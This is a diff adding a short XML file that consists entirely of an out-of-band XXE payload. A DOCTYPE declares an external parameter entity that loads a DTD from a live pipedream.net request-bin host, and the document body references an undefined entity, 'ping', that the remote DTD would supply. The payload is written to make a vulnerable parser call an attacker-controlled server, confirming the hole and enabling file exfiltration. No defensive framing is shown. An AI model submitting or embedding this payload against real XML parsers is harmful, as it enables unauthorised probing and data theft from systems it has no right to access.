@@ -1,0 +1,8 @@
+<?xml version="1.0"?>  
+<!DOCTYPE root [  
+<!ENTITY % remote SYSTEM "https://enuz08tcaa9sj.x.pipedream.net/test2" >  
+%remote;  
+]>  
+<comment>  
+<text>test&ping;</text>  
+</comment>  
